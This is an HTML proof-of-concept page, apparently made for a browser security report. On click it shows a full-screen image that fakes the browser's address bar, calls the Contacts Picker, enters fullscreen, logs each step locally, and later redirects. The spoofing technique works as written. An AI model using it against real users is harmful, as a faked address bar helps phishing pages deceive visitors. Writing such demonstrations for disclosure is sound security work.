<!DOCTYPE html>
<html lang="en">
<head>
  <title>Security UI Spoof – UX Demo</title>
  <meta charset="utf-8">
  <meta name="viewport"
        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>

  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: #000;
      font-family: sans-serif;
      overflow: hidden;
    }

    #spoof {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      display: none;
      z-index: 9999;
      pointer-events: none;
    }

    #content {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      text-align: center;
      z-index: 1;
    }

    #logArea {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      max-height: 35vh;
      overflow-y: auto;
      background: rgba(0,0,0,.75);
      color: #0f0;
      font-size: 12px;
      font-family: monospace;
      padding: 8px;
      z-index: 10000;
      white-space: pre-wrap;
      box-sizing: border-box;
    }

    #saveBtn {
      position: fixed;
      top: 10px;
      right: 10px;
      z-index: 10001;
      padding: 8px 12px;
      font-size: 12px;
    }
  </style>
</head>

<body>

<img id="spoof" src="spof2.png" alt="spoof">

<div id="content">
  <h1>Click anywhere on the page to spoof the omnibox!</h1>
</div>

<button id="saveBtn">Save Logs</button>
<div id="logArea">[LOG INIT]</div>

<script>
let enteredFullscreen = false;

/* Logger */
function logEvent(type, data = {}) {
  const entry = {
    time: new Date().toISOString(),
    type,
    ...data
  };

  const logs = JSON.parse(localStorage.getItem('poc_logs') || '[]');
  logs.push(entry);
  localStorage.setItem('poc_logs', JSON.stringify(logs));

  const logArea = document.getElementById('logArea');
  logArea.textContent += `\n${entry.time} | ${type} ${JSON.stringify(data)}`;
  logArea.scrollTop = logArea.scrollHeight;

  console.log('[LOG]', entry);
}

/* Main action */
document.addEventListener('click', async () => {

  /* Contacts Picker */
  if (navigator.contacts && navigator.contacts.select) {
    logEvent('contacts_picker_called');

    navigator.contacts.select(["name"], {})
      .then(result => {
        logEvent('contacts_picker_closed', {
          granted: true,
          count: result.length
        });
      })
      .catch(err => {
        logEvent('contacts_picker_closed', {
          granted: false,
          reason: err.name
        });
      });
  } else {
    logEvent('contacts_api_not_supported');
  }

  /* Show spoof */
  document.getElementById('spoof').style.display = 'block';
  document.getElementById('content').style.display = 'none';
  logEvent('spoof_shown');

  /* Enter fullscreen */
  if (document.documentElement.requestFullscreen) {
    try {
      await document.documentElement.requestFullscreen();
      enteredFullscreen = true;
      logEvent('entered_fullscreen');
    } catch (e) {
      logEvent('fullscreen_failed', { error: e.message });
    }
  }

}, { once: true });

/* Exit fullscreen → delayed redirect */
document.addEventListener('fullscreenchange', () => {
  if (enteredFullscreen && !document.fullscreenElement) {
    logEvent('exit_fullscreen_detected');

    setTimeout(() => {
      logEvent('redirect_to_google');
      location.href = 'https://google.com';
    }, 1200); // delay smooth
  }
});

/* Save logs */
document.getElementById('saveBtn').onclick = () => {
  const data = localStorage.getItem('poc_logs') || '[]';
  const blob = new Blob([data], { type: 'application/json' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'poc_logs.json';
  a.click();
  logEvent('logs_saved');
};
</script>

</body>
</html>
